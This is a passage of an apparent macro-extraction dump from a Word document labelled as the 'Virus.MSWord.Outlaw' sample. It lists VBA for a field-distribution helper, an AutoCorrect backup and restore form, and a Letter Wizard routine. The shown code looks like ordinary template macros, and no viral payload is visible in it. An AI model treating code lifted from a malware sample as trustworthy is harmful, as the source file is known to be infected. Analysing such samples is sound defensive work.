            rgn.Font.DisableCharacterSpaceGrid = False
            Set rgn = .Range
           ' Insert Field
            .Fields.Add .Range, , , False
            ' { eq \o\ad(foo,     ) }
            '                      ~ Remove tip space
            rgn.Select
            rgn.SetRange .Range.End - 2, .Range.End - 1
            rgn.Text = ""
            
            .Fields.ToggleShowCodes
            .MoveRight , 1, 1
LContinue:
        Next para
    End With
    rgnOrg.Select
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

' *************************************
Function FIsSpace(wh$)
    ch = AscW(wh$)
    ' Space DBSpace EmSpace EnSpace 1/4EmSpace
    If ch = 32 Or ch = 12288 Or ch = 8197 Or ch = 8194 Or ch = 8195 Then
        FIsSpace = ch
    Else
        FIsSpace = 0
    End If
End Function


Sub Delete()
    Dim rgn As Range
    Dim rgnFld As Range
    Dim rgnNew As Range
    Dim fld As Field
    Dim FUpdate As Boolean
    
    On Error GoTo LError
    If (Application.ScreenUpdating = True) Then
        FUpdate = True
        Application.ScreenUpdating = False
        System.Cursor = wdCursorWait
    Else
        FUpdate = False
    End If
    
    With Selection
        Set rgn = .Range
        
        If (.Fields.Count < 1) Then
'            Create (Len(.Text) + 1)
            Beep
            GoTo LExit:
        End If
        For Each fld In rgn.Fields
            A$ = fld.Code
            Set rgnFld = fld.Code
            If (FIsDistField(rgnFld.Text) = False) Then
                GoTo LContinue:
            End If
            rgnFld.Select
            
            iTop = InStr(1, A$, "(") + rgnFld.Start
            iEnd = rgnFld.End - (Len(rgnFld.Text) - InStr(1, A$, ",　") + 1)
            rgnFld.SetRange iTop, iEnd
            
            .MoveLeft
            Set rgnNew = Selection.Range
            rgnNew.FormattedText = rgnFld.FormattedText
            rgnNew.Font.DisableCharacterSpaceGrid = True
            rgnNew.Select
            .MoveRight
            .MoveRight , 1, 1
            .Delete
LContinue:
        Next fld
        rgn.Select
    End With
LExit:
    If (FUpdate = True) Then
        Application.ScreenUpdating = True
        System.Cursor = wdCursorNormal
    End If
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub


Sub Resize(fld As Field, iNew As Integer)
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    On Error GoTo LError
    With Selection
        Dim rgn As Range
        A$ = fld.Code
        Set rgn = fld.Code
        
        iTop = rgn.End - (Len(A$) - InStr(1, A$, ",　"))
        iEnd = rgn.End - (Len(A$) - InStr(1, A$, ")") + 1)
        rgn.SetRange iTop, iEnd
        rgn.Text = String$(iNew, "　")
    End With
LExit:
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub


Function FIsDistField(szFld As String) As Boolean
    FIsDistField = False
    ' { eq \o\ad(foo,　　　)}
    '   ~~~~~~~~~        ~~~
    If (Left$(szFld, 10) = " eq \o\ad(") And (Right$(szFld, 2) = "　)") Then
        FIsDistField = True
    End If
End Function






-------------------------------------------------------------------------------
VBA MACRO UF01.frm 
in file: Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669 - OLE stream: 'Macros/VBA/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







Option Explicit

' START LOCALIZATION'
 Const StatMsg1 = "加入自動校正項目： "
 Const StatMsg2 = " 之 "
 Const StatMsg3 = "正在建立樣式..."
 Const StatMsg4 = "正在儲存..."
 Const TagText = "自動校正項目備份文件"
 Const szAppName = "自動校正工具集"
 Const szErrorMsg = "有錯誤發生。您要再試一次嗎？"
 Const szACEntriesErrorMsg = "有錯誤發生。 文件的樣式可能有問題。"
 Const szWarnMsg = "程式將從備份文件中取出儲存的自動校正項目，目前自動校正項目中相同名稱的部份將會被取代掉。您還要繼續嗎？"
 Const szFormatIncorrect = "這份文件的樣式不是正確的備份文件樣式"
 Const szRestoreCompletemsg = "已完成重新載入。"
' END LOCALIZATION'

'***********   btnBackup_Click() ******************
'
' Hides the form, creates a new Word document, calls GetAutoCorrectEntries(),
' adds the text "AutoCorrect Backup Document" at the top of the document,
' and saves the document by calling SaveACDoc.
'
' Uses valuable y that doesn't do anything.

Private Sub btnBackup_Click()
Dim Y As Integer

Autocorrect.Hide
Application.ScreenUpdating = False

'create new document
Application.Documents.Add
   
 ' call GetAutoCorrectEntries() user defined
  Y = GetAutoCorrectEntries()
  
' add Text to top of document
 With Selection
    .SplitTable
    .TypeText Text:=TagText
    .TypeParagraph
  End With
  
'add some formatting
  With ActiveDocument.Sentences(1)
    .Bold = True
    .Font.Size = 14
  End With

' Save the Document,call SaveACDoc() user defined, close if successful
Application.StatusBar = StatMsg4
If SaveACDoc = True Then
 ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
End If
Application.ScreenUpdating = True
Autocorrect.Show
End Sub

Private Sub btnClose_Click()
Autocorrect.Hide
End Sub

'************* btnRestore_Click() **************
'
' First warns the user that this will replace their existing entries.
' If they answer no it jumps to the end of the function.  Then displays
' the FileOpen dialog box to get the name of an existing AutoCorrect backup
' document (creating using the Backup button.)  Next calls OpenACDoc() to open
' the file. If successful it calls RestoreACEntries(). Finally, it closes the document.
'
'
'
Private Sub btnRestore_Click()
Dim ACFileName, Title As String
Dim Style, Response, x As Integer

Autocorrect.Hide

' warn users about replaced entries...
Style = vbYesNo + vbInformation + vbDefaultButton2 ' Define buttons.
Title = szAppName
Response = MsgBox(szWarnMsg, Style, Title)
If Response = vbNo Then
   'exit
    GoTo bye:
End If

' bring up fileopen and get a name
With Dialogs(wdDialogFileOpen)
    .Display
    ACFileName = .Name
End With

' Open a Document,call OpenACDoc() user defined
If OpenACDoc(ACFileName) = True Then 'error
    ' Restore Entries, call RestoreACEntries() user defined
    x = RestoreACEntries()
    ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
End If

bye:
Autocorrect.Show
End Sub

Function RestoreACEntries()
Dim i, NumRows As Integer
Dim oDoc, oACorrect, oTable As Object

Dim szName As String
Dim szValue As String
Dim szRTF As String

Err.Clear
On Error GoTo RestoreACEntriesErrors:

    ' check for correct format
    If ActiveDocument.Words(1) = TagText Then
        Application.ScreenUpdating = False
        
        Set oDoc = ActiveDocument
        Set oTable = oDoc.Tables(1)
        Set oACorrect = Application.Autocorrect.Entries

        NumRows = ActiveDocument.Tables(1).Rows.Count
        Selection.GoTo What:=wdGoToTable, Which:=wdGoToFirst
        Selection.MoveRight unit:=wdCell, Count:=3
    
        For i = 2 To NumRows
            szName = Selection.Text
            Selection.MoveRight unit:=wdCell
            szValue = Selection.Text
            Selection.MoveRight unit:=wdCell
            szRTF = Selection.Text
            If szRTF = "False" Then
                Application.StatusBar = StatMsg1 & szName
                oACorrect.Add Name:=szName, Value:=szValue
            Else
                Application.StatusBar = StatMsg1 & szName
                Selection.MoveLeft unit:=wdCell
                oACorrect.AddRichText szName, Selection.Range
                Selection.MoveRight unit:=wdCell
            End If
            Selection.MoveRight unit:=wdCell
        Next i
        Application.ScreenUpdating = True
        MsgBox szRestoreCompletemsg
    Else
        MsgBox szFormatIncorrect
    End If
    
    
RestoreACEntriesErrors:
Select Case Err.Number
    Case 0:
    ' no error
    Case Else
      MsgBox (szACEntriesErrorMsg & vbCr & Err.Number & "  " & Err.Description & " " & szName)
End Select
  
    
End Function

'****** GetAutoCorrectEntries() ******
'
' Inserts each AutoCorrect entry into a Word document including the Value and whether
' or not it is to include formatting.  Name is the current name of the entry,
' Value is the text value of the entry, and RTF is a Boolean that is True if the entry
' has "formatted text" checked.  Then converts the text into a table and adds a heading row to the table.
'
' x is used to loop through the AutoCorrect entries.
' TotalACEntries is the number of AC entries.

Private Function GetAutoCorrectEntries()
Dim x As Integer
Dim TotalACEntries As Integer

TotalACEntries = Application.Autocorrect.Entries.Count
For x = 1 To TotalACEntries
    With Selection
         .TypeText Text:=Application.Autocorrect.Entries.item(x).Name
         .TypeText vbTab
           
          'check for formatting and insert RTF text if necessary
          If Application.Autocorrect.Entries.item(x).RichText = True Then
               Application.Autocorrect.Entries(x).Apply Range:=Selection.Range
          Else
             .TypeText Text:=Application.Autocorrect.Entries.item(x).Value
          End If
           
          .TypeText vbTab
           .TypeText Text:=Application.Autocorrect.Entries.item(x).RichText
          .TypeParagraph
    End With
    
    'update status bar
'   Application.StatusBar = StatMsg1 & X & StatMsg2 & TotalACEntries
    Application.StatusBar = StatMsg1 & TotalACEntries & StatMsg2 & x
Next x


' convert to table
Application.StatusBar = StatMsg3
Selection.HomeKey unit:=wdStory, Extend:=wdExtend

Selection.ConvertToTable Separator:=wdSeparateByTabs, Format:=wdTableFormatSimple1, _
  ApplyBorders:=False, ApplyShading:=False, ApplyFont:=False, ApplyColor:=False, _
  ApplyHeadingRows:=False, ApplyLastRow:=False, ApplyFirstColumn:=False, ApplyLastColumn:=False, _
  AutoFit:=True

' add row heading
With Selection
    .MoveUp unit:=wdLine, Count:=1
    .InsertRows 1
    .TypeText Text:="Name"
    .MoveRight unit:=wdCell
    .TypeText Text:="Value"
    .MoveRight unit:=wdCell
    .TypeText Text:="RTF"
    .HomeKey unit:=wdStory
End With
    
 'Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext
 'Selection.InsertBreak Type:=wdPageBreak
    
End Function

Public Function SaveACDoc()
Dim Style, Response As Integer
Dim Title As String

SaveACDoc = True
Err.Clear
On Error GoTo SaveACDocErrors

ActiveDocument.Save

SaveACDocErrors:
Select Case Err.Number
    Case 0:
    ' no error
    Case 4198:
    ' cancel
    SaveACDoc = False
    Case Else
      Style = vbYesNo + vbCritical + vbDefaultButton2 ' Define buttons.
      
      ' put error number and description in title of the message box
      Title = Err.Number & "  " & Err.Description
        
      Response = MsgBox(szErrorMsg, Style, Title)
      If Response = vbYes Then
          Resume 'bring up SaveAs again
      Else    ' User choose No.
          SaveACDoc = False
      End If
End Select

End Function


Public Function OpenACDoc(ByVal ACFileOpenName As String) As Boolean

Dim Style As Integer

OpenACDoc = True
Err.Clear
On Error GoTo OpenACDocErrors

Documents.Open FileName:=ACFileOpenName

OpenACDocErrors:
If Err.Number <> 0 Then
   OpenACDoc = False
End If

End Function

-------------------------------------------------------------------------------
VBA MACRO UM01.bas 
in file: Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669 - OLE stream: 'Macros/VBA/UM01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'**************************************************
' Letter Wizard
' StartWizard Macro
' %% Copyright c 1995 Microsoft Corporation
'**************************************************

'%% Universal DLL declarations
'Declare Function FindWindow Lib "user.exe"(lpClassName$, lpWinName$) As 'Integer Alias "FindWindow"
'Declare Function WinHelp Lib "user.exe"(hWnd As Integer, lpHelpFile$, 'wCommand As Integer, dwData As Long) As Integer Alias "WinHelp"
Private Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName$, ByVal lpWinName$) As Long
Private Declare Function WinHelp Lib "user32.dll" Alias "WinHelpA" (ByVal hwnd As Long, ByVal lpHelpFile$, ByVal wCommand As Long, ByVal dwData As Long) As Long

'%% Universal shared variables %%
Public State, LastState
Public StateItems__()
Public dlg As Object
Public HideFilePreview__()
Public wizname$
Public iWorkDoc, iEmptyDoc, workDoc$, emptyDoc$
Public HelpCtx
Public gDoogie

'%% Wizard-specific shared variables %%
Public LettersPath$        'Path to prewritten business letters (LETTERS-PATH)
Public LetterMax   'Number of letters
Public LetterNames__$() 'Names of letters
Public LetterFiles__$()    'Filenames of letters
Public defLttr     'Default category and letter
Public RetAddressLines 'DAPFEL
Public gEnvelopeLabel
Public dlgEL As Object
Public toui As Object
Public gPrewrittenFile$
Public gCurrentHeadingPosition, rtDistToLftDist
Public RetAddress__$() 'Return Address Array (max 5)
'%% Strings galore
Public kThing$, kUpThing$, kWizname$, Wizard_$, Normal_$, kGallery$
Public kErrBadDoc$, kTip$, kLetterPath$, kLettersDir$, kLongLettersDir$
Public kSetupDialog$, kCreatingDoc$, kSaveSettings$, kRstSettings$
Public kRstStylsheet$, kLookingForLetters$, kLoadingLetterDetails$, kLookingFor$, kEnterRecipientAddress$
Public chQuote$, kAddressATEntry$
Public Dot_$, Letter_$, kRE$, kAccountID$, kDear$, kRecipient$, kTypeHere$, TPath$, kName$
Public kClosePersonal$, kCloseBusiness$, kWritersInitials$, kTypistsInitials$
Public kCC$, kNames$, kEnclosures$, kNumber$, kAttachments$, kFormalDateFormat$, kPage$, kEmptyMacro$, kInsertAddress$, kMacroButton$
Public kErrLetterNotFound$, kErrThatLetterNotFound$
Public kErrStyleNotFound1$, kErrStyleNotFound2$, kErrCannotCreate1$, kErrCannotCreate2$
Public kTypeCompanyName$
Public kFntArial$, kFntWndngs$, kDfltPageNum$
Public pt90_$, pt72_$, pt216_$, kFtrDist1$, kFtrDist2$
Public kErrMaxLines$
Public cntmplet$, proflett$, eleglett$
Public kStyCmpnyName$, kStyBodyText$, kStyRetAddr$, kStyCC$, kStyEncl$, kStySigName$, kStySal$, kStySubjLine$, kStyDate$, kStyInsideAddr$, kStyRefIntls$
Public Const strERR_WIZ_NOT_FOUND   As String = "Word 在使用者範本的設定路徑裡，找不到本精靈。"
Public Const strWizShortName = "Cletter"

Rem
Rem ======== InitStrings ========
Rem Please read LocNotes before localizing!
Rem
Private Sub InitStrings()
Dim kRstStylesheet$

Rem Name of wizard & document/object produced
    kThing$ = "英文信件"
    kUpThing$ = "英文信件"
    kWizname$ = "英文信件精靈"
    WordBasic.PrintStatusBar "啟動" + kWizname$ + "..."
    Wizard_$ = kWizname$ 'Should be name as it appears in FileNew (change if different)
    Normal_$ = "normal" 'normal template
    kPage$ = "  Page "
    kName$ = "在此處輸入姓名"
    kEmptyMacro$ = "EmptyMacro "
    kGallery$ = "Gallery Example"
    kInsertAddress$ = "InsertAddress" 'Used to check if MAPI is present
    kMacroButton$ = "MACROBUTTON "
Rem Default address stored as AT Entry. used to check if user has entered an address in prewritten business letters
    kAddressATEntry$ = "Company Name" + Chr(13) + "Street Address" + Chr(13) + "City, State/Province  Zip/Postal"
    kEnterRecipientAddress$ = "  在此處輸入收件人地址 "
Rem Fonts
    kFntArial$ = "Arial"
    kFntWndngs$ = "Wingdings"
    kDfltPageNum$ = "l"
Rem Misc strings
    kErrBadDoc$ = "精靈無法使用現行文件。若要執行精靈，請選「檔案」「開新檔案」，再選取" + Wizard_$ + "。"
    kTip$ = "提示:"
    kLetterPath$ = "letters-path" 'optional .ini file setting
Rem Banter strings
    kSetupDialog$ = "正在設定對話方塊..."
    kCreatingDoc$ = "正在建立文件..."
    kSaveSettings$ = "正在儲存設定..."
    kRstSettings$ = "正在還原設定..."
    kRstStylesheet$ = "正在還原樣式..."
    kLookingForLetters$ = "正在尋找信件..."
    kLoadingLetterDetails$ = "正在載入信件細節..."
    kLookingFor$ = "尋找" '--> 'Looking for "somefile.dot"...'
    chQuote$ = Chr(34)  ' "
Rem Style strings
    kStyCmpnyName$ = "Company Name"
    kStyBodyText$ = "Body Text Keep"
    kStyRetAddr$ = "Return Address"
    kStyInsideAddr$ = "Inside Address"
    kStyCC$ = "CC"
    kStyEncl$ = "Enclosure"
    kStySigName$ = "Signature Name"
    kStySal$ = "Salutation"
    kStySubjLine$ = "Subject Line"
    kStyDate$ = "Date"
    kStyRefIntls$ = "Reference Initials"
Rem == Other strings specific to this wizard ==
    Letter_$ = "letter"  'Prefix for wizard stylesheets (eg, Letter1.dot)
    Dot_$ = ".dot"
    kRE$ = "Subject: "
    kAccountID$ = "電子郵件帳號/文件識別碼"
    kDear$ = "Dear "
    kTypeHere$ = "在此處輸入信件內容"
    kRecipient$ = "  在此處輸入收件者姓名  "
    kClosePersonal$ = "Yours truly,"
    kCloseBusiness$ = "Sincerely,"
    kWritersInitials$ = "  在此處輸入寄件者姓名縮寫  "
    kTypistsInitials$ = "  在此處輸入編繕者姓名縮寫  "
    kCC$ = "Cc: "
    kNames$ = "  在此處輸入姓名  "
    kEnclosures$ = "Enclosures: "
    kNumber$ = "  在此處輸入號碼  "
    kAttachments$ = "Attachments"
    kFormalDateFormat$ = "MMMM d, yyyy"
Rem Measurements
    pt90_$ = "90pt"
    pt72_$ = "72pt"
    pt216_$ = "216pt"
    kFtrDist1$ = "0.5"  ' Used in DoStyleMerge
    kFtrDist2$ = "0.93" ' Used in DoStyleMerge
Rem Error messages
    kErrLetterNotFound$ = "找不到預設信件。"
    kErrThatLetterNotFound$ = "找不到預設信件。請執行安裝程式並選取信件範例。" 'wizard cannot find this letter. Please choose another."
    kErrLetterNotFound$ = "找不到預設信件。"
    kErrThatLetterNotFound$ = "精靈找不到此信件，請選取其它信件。"
    kErrStyleNotFound1$ = "精靈找不到樣式範本"
    kErrStyleNotFound2$ = "。"
    kErrCannotCreate1$ = "精靈無法建立信件，因為'"
    kErrCannotCreate2$ = "' 不存在。"
    kTypeCompanyName$ = "輸入公司名稱"
    kErrMaxLines$ = "回信地址不可超過五行。"
End Sub 'InitStrings




'%% StartWizard Macro %%
Public Sub MAIN()
ReDim StateItems__(12)
ReDim HideFilePreview__(12)
ReDim LetterNames__$(18)
ReDim LetterFiles__$(18)
ReDim RetAddress__$(8)
Dim p$
Dim x
Dim iWindowNumber
Dim faddr As String, freaddr As String
    
State = 0
LastState = 0
Set dlg = WordBasic.DialogRecord.UserDialog(False)
wizname$ = ""
iWorkDoc = 0
iEmptyDoc = 0
workDoc$ = ""
emptyDoc$ = ""
HelpCtx = 0
gDoogie = 0
LettersPath$ = ""
LetterMax = 0
defLttr = 0
RetAddressLines = 0
gEnvelopeLabel = 0
Set dlgEL = WordBasic.DialogRecord.ToolsEnvelopesAndLabels(False)
Set toui = WordBasic.DialogRecord.ToolsOptionsUserInfo(False)
gPrewrittenFile$ = ""
gCurrentHeadingPosition = 0
rtDistToLftDist = 0
kThing$ = ""
kUpThing$ = ""
kWizname$ = ""
Wizard_$ = ""
Normal_$ = ""
kGallery$ = ""
kErrBadDoc$ = ""
kTip$ = ""
kLetterPath$ = ""
kLettersDir$ = ""
kLongLettersDir$ = ""
kSetupDialog$ = ""
kCreatingDoc$ = ""
kSaveSettings$ = ""
kRstSettings$ = ""
kRstStylsheet$ = ""
kLookingForLetters$ = ""
kLoadingLetterDetails$ = ""
kLookingFor$ = ""
kEnterRecipientAddress$ = ""
chQuote$ = ""
kAddressATEntry$ = ""
Dot_$ = ""
Letter_$ = ""
kRE$ = ""
kAccountID$ = ""
kDear$ = ""
kRecipient$ = ""
kTypeHere$ = ""
TPath$ = ""
kName$ = ""
kClosePersonal$ = ""
kCloseBusiness$ = ""
kWritersInitials$ = ""
kTypistsInitials$ = ""
kCC$ = ""
kNames$ = ""
kEnclosures$ = ""
kNumber$ = ""
kAttachments$ = ""
kFormalDateFormat$ = ""
kPage$ = ""
kEmptyMacro$ = ""
kInsertAddress$ = ""
kMacroButton$ = ""
kErrLetterNotFound$ = ""
kErrThatLetterNotFound$ = ""
kErrStyleNotFound1$ = ""
kErrStyleNotFound2$ = ""
kErrCannotCreate1$ = ""
kErrCannotCreate2$ = ""
kTypeCompanyName$ = ""
kFntArial$ = ""
kFntWndngs$ = ""
kDfltPageNum$ = ""
pt90_$ = ""
pt72_$ = ""
pt216_$ = ""
kFtrDist1$ = ""
kFtrDist2$ = ""
kErrMaxLines$ = ""
cntmplet$ = ""
proflett$ = ""
eleglett$ = ""
kStyCmpnyName$ = ""
kStyBodyText$ = ""
kStyRetAddr$ = ""
kStyCC$ = ""
kStyEncl$ = ""
kStySigName$ = ""
kStySal$ = ""
kStySubjLine$ = ""
kStyDate$ = ""
kStyInsideAddr$ = ""
kStyRefIntls$ = ""
    
    kLettersDir$ = "letters\"   'letters subdirectory - localize
    kLongLettersDir$ = "信件傳真\"
    WordBasic.WaitCursor 1  'This'll take a little while
    InitStrings
    'Get the templates directory. The templates are supposed to be in the same directory as that of the wizard
    Dim TempDlg As Object: Set TempDlg = WordBasic.DialogRecord.FileTemplates(False)
    WordBasic.CurValues.FileTemplates TempDlg
    p$ = TempDlg.Template
    If p$ = "" Then 'user might be creating a new template. Look at the default directory for style templates
        TPath$ = StrWizardPath
        If WordBasic.[Right$](TPath$, 1) <> "\" Then TPath$ = TPath$ + "\"
        If WordBasic.[Files$](TPath$ + kLongLettersDir$ + "*" + Dot_$) = "" Then
            TPath$ = TPath$ + kLettersDir$ 'short name
        Else
            TPath$ = TPath$ + kLongLettersDir$
        End If
    Else
        TPath$ = WordBasic.[FileNameInfo$](p$, 5)
    End If
    
    'TPath$ = "C:\Program Files\Microsoft Office\Templates\信件傳真\"
    Rem Names of templates for style merges
    If WordBasic.[Right$](TPath$, 1) <> "\" Then TPath$ = TPath$ + "\"
    cntmplet$ = TPath$ + "現代式信件.dot"
    If WordBasic.[Files$](cntmplet$) = "" Then cntmplet$ = TPath$ + "letter1.dot"
        
    proflett$ = TPath$ + "專業式信件.dot"
    If WordBasic.[Files$](proflett$) = "" Then proflett$ = TPath$ + "letter3.dot"
    
    eleglett$ = TPath$ + "典雅式信件.dot"
    If WordBasic.[Files$](eleglett$) = "" Then eleglett$ = TPath$ + "letter2.dot"

    rtDistToLftDist = 1.25 'Used in DateTabPlace$ in CreateLetter
    VerifyEnvirons
    GetPrewrittenDetails
    WordBasic.PrintStatusBar kSetupDialog$

    WordBasic.BeginDialog 558, 252, kWizname$, "StartWizard.DlgControl"

    'General controls, 0-7 (hands off!)
        WordBasic.Picture 2, 216, 500, 11, "LinePic", 1, "LinePicA" 'Workaround odd picture bug --
        WordBasic.Picture 130, 216, 416, 11, "LinePic", 1, "LinePicB" ' use two copies to go entire width
        WordBasic.OKButton 41, 176, 73, 21  '2 -- Will never be seen! (o.w. it'd always be default)
        WordBasic.PushButton 147, 170, 75, 20, "提示(&H)"   '3
        WordBasic.CancelButton 205, 228, 75, 19 '4
        WordBasic.PushButton 286, 228, 94, 19, "<上一步(&B)"    '5
        WordBasic.PushButton 380, 228, 94, 19, "下一步(&N)>"    '6
        WordBasic.PushButton 476, 228, 75, 19, "完成(&F)"   '7
        WordBasic.FilePreview 7, 3, 240, 206, "Preview" '8
        StateItems__(0) = 9 'Number of general (state-independent) controls

    '%% Wizard-specific states go here %%
    'State 1
        WordBasic.Text 259, 9, 229, 19, "精靈可以設計出數種型式的英文信件。"
        WordBasic.Text 269, 45, 104, 13, "您想要那一類的信件?"
        WordBasic.OptionGroup "LetterMethod"
            WordBasic.OptionButton 290, 84, 215, 16, "撰寫商業信件(&B)", "optlm2"
            WordBasic.OptionButton 290, 104, 215, 16, "撰寫私人信件(&P)", "optlm3"
        WordBasic.Text 307, 60, 208, 16, "", "Text1" 'Placeholder
        WordBasic.Text 266, 145, 40, 13, kTip$, "tip1"
        WordBasic.Text 315, 145, 208, 66, " ", "tip1text"
        ItemsInState 8  'Number of items in state
    
    'State 2: Letter options
        WordBasic.Text 262, 20, 271, 19, "您想將哪些項目加入信件中?"
        WordBasic.CheckBox 286, 50, 214, 16, "頁碼(&P)", "chkloPage"
        WordBasic.CheckBox 286, 70, 214, 16, "日期(&D)", "chkloDate"
        WordBasic.CheckBox 286, 90, 251, 16, "電子郵件帳號或文件識別碼(&I)", "chkloID"
        WordBasic.CheckBox 286, 110, 214, 16, "寫信者簽名(&W)", "chkloWriterInitials"
        WordBasic.CheckBox 286, 130, 214, 16, "打字者簽名(&T)", "chkloTypistInitials"
        WordBasic.CheckBox 286, 150, 214, 16, "副本(&C)", "chkloCC"
        WordBasic.CheckBox 286, 170, 214, 16, "隨函(&E)", "chkloEnclosures"
        WordBasic.CheckBox 286, 190, 214, 16, "附件(&A)", "chkloAttachments"
        ItemsInState 9

    'State 3
        WordBasic.Text 277, 44, 230, 18, "您要選取何種格式的信件?"
        WordBasic.OptionGroup "UseLetterhead"
            WordBasic.OptionButton 298, 68, 189, 16, "含標頭的信件(&L)", "LetterHeadYes"
            WordBasic.OptionButton 298, 88, 189, 16, "不含標頭的信件(&P)", "LetterHeadNo"
        ItemsInState 4

    'State 4
        WordBasic.Text 267, 7, 273, 17, "您要將信件標頭設計放在頁面何處?"
        WordBasic.OptionGroup "LetterHeadPosition"
            WordBasic.OptionButton 285, 30, 104, 16, "靠上(&T)", "AtTheTop"
            WordBasic.OptionButton 285, 50, 109, 16, "靠左(&L)", "OnTheLeft"
            WordBasic.OptionButton 285, 70, 119, 16, "靠右(&R)", "OnTheRight"
        WordBasic.Text 267, 107, 262, 17, "信件標頭設計需要多大的間距(&S)?"
        WordBasic.TextBox 286, 125, 65, 18, "textLetterheadSpace"
        WordBasic.Text 261, 172, 40, 13, kTip$, "tip5"
        WordBasic.Text 306, 172, 220, 39, " ", "tip5text"
        ItemsInState 9

    'State 5
        WordBasic.Text 265, 9, 280, 12, "輸入收信人資料或由通訊錄中選取(&T):"
        WordBasic.TextBox 265, 46, 258, 67, "textRecipientAddress", 1
        WordBasic.Text 265, 115, 115, 12, "寄信人地址(&Y):"
        WordBasic.TextBox 265, 152, 258, 56, "textReturnAddress", 1
        WordBasic.PushButton 398, 24, 127, 21, "通訊錄(&A)...", "Push1" '43
        WordBasic.PushButton 398, 129, 127, 21, "通訊錄(&X)...", "Push2" '44
        ItemsInState 6
        
    'State 6
        WordBasic.Text 258, 42, 300, 17, "您想選用何種樣式?"
        WordBasic.OptionGroup "WizStyle"
            WordBasic.OptionButton 278, 65, 200, 16, "古典式(&C)"
            WordBasic.OptionButton 278, 85, 200, 16, "現代式(&O)"
            WordBasic.OptionButton 278, 105, 200, 16, "標準式(&T)"
        ItemsInState 5

    'State 7: Finish
        WordBasic.Picture 0, 0, 269, 215, "FlagPic", 1, "flag"
        WordBasic.Text 277, 60, 237, 20, "精靈已完成建立信件的詢問選項!"
        WordBasic.Text 289, 103, 212, 15, "信件建立之後您還想做什麼?"
        WordBasic.OptionGroup "HelpOrEnvelope"
            WordBasic.OptionButton 308, 126, 222, 14, "建立信封或郵寄標籤(&C)"
            WordBasic.OptionButton 308, 146, 222, 16, "只要顯示信件即可(&J)"
        ItemsInState 6 'Number of items in state
        HideFilePreview__(LastState) = 1
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
    
    ' Set some default values
    WordBasic.CurValues.ToolsOptionsUserInfo toui
    gEnvelopeLabel = 0

    'We're ready (finally!) to throw the wizard onto the screen:
    If WordBasic.Dialog.UserDialog(dlg) = 0 Then
        WordBasic.WaitCursor 1
        WordBasic.ToolsOptionsGeneral BlueScreen:=gDoogie
        WordBasic.WindowList (iWorkDoc) 'ensure work doc is in front for tests
        If WordBasic.Window() <> iWorkDoc Then Exit Sub
        WordBasic.DocClose 2 'Close the document(w/out saving)
        If WordBasic.[WindowName$]() <> emptyDoc$ Then Exit Sub
        WordBasic.DocClose 2 'Close the empty doc
    Else
        WordBasic.WaitCursor 1
        WordBasic.ToolsOptionsGeneral BlueScreen:=gDoogie
        WordBasic.WindowList (iWorkDoc) 'ensure work doc is in front
        WordBasic.ScreenUpdating -1
        If gEnvelopeLabel Then
            If WordBasic.ExistingBookmark("recipAddr") <> 0 Then WordBasic.WW7_EditGoTo "recipAddr"
            dlgEL.ExtractAddress = 0
            x = WordBasic.Dialog.ToolsEnvelopesAndLabels(dlgEL) 'we already setup dlgEL (see below)
            If dlgEL.AddrText = "" Then
                faddr = dlgEL.EnvAddress
            Else
                faddr = dlgEL.AddrText
            End If
            If dlgEL.RetAddrText = "" Then
                freaddr = dlgEL.EnvReturn
            Else
                freaddr = dlgEL.RetAddrText
            End If
            Select Case x
                Case 1
                    If dlgEL.Tab <> "0" Then
                        Application.MailingLabel.DefaultPrintBarCode = False
                        Application.MailingLabel.PrintOut Address:=faddr
                    Else
                        ActiveDocument.Envelope.PrintOut ExtractAddress:=dlgEL.ExtractAddress, Address:=faddr, returnAddress:=freaddr
                    End If
                    ' need to print a document
                Case 2
                    If dlgEL.Tab <> "0" Then
                        Application.MailingLabel.DefaultPrintBarCode = False
                        Application.MailingLabel.CreateNewDocument Address:=faddr
                    Else
                        ActiveDocument.Envelope.Insert ExtractAddress:=dlgEL.ExtractAddress, Address:=faddr, returnAddress:=freaddr
                    End If
                    ' need to do a WindowList(iWorkDoc) here..
                Case Else
                    'do nothing
            End Select
            If WordBasic.ExistingBookmark("letterbody") <> 0 Then
                WordBasic.WW7_EditGoTo "letterbody"
                WordBasic.LineDown 1, 1
            End If
        End If
        WordBasic.FileTemplates Store:=0, Template:=Normal_$, LinkStyles:=0
        'WindowNumber changes when user selects Envelops and Labels since in some languages it is opened as "address" and comes before empty doc.
        iWindowNumber = 1
        While (iWindowNumber <= WordBasic.CountWindows())
            If (WordBasic.[WindowName$](iWindowNumber) = emptyDoc$) Then
                WordBasic.WindowList (iWindowNumber)
                WordBasic.DocClose 2
            End If
            iWindowNumber = iWindowNumber + 1
        Wend
        
    End If
    'All done!
    WordBasic.ScreenUpdating -1
    
End Sub '%% StartWizard

'======================================================
'%% Wizard-specific routines

Private Sub GetPrewrittenDetails()
Dim def$
Dim path$
Dim i
    WordBasic.PrintStatusBar kLookingForLetters$
    def$ = WordBasic.[GetDocumentVar$]("LetterName")
    defLttr = -1
    path$ = xFetchPref$(kLetterPath$) 'Has this been defined in wordwiz.ini??
    If path$ = "" Then path$ = WordBasic.[GetProfileString$](kLetterPath$) '..How about in win.ini/winword6.ini?
    If path$ = "" Then 'No, so assume they're in subdir of program directory
        path$ = WordBasic.[DefaultDir$](9) 'get program directory

        If path$ <> "" Then
            If WordBasic.[Right$](path$, 1) <> "\" Then path$ = path$ + "\"
            path$ = path$ + kLettersDir$        'letters subdirectory
            If WordBasic.[Files$](path$ + "*.*") = "" Then path$ = WordBasic.[Left$](path$, Len(path$) - 8)
        Else
            path$ = WordBasic.[Files$](".")         'this is the best we can do
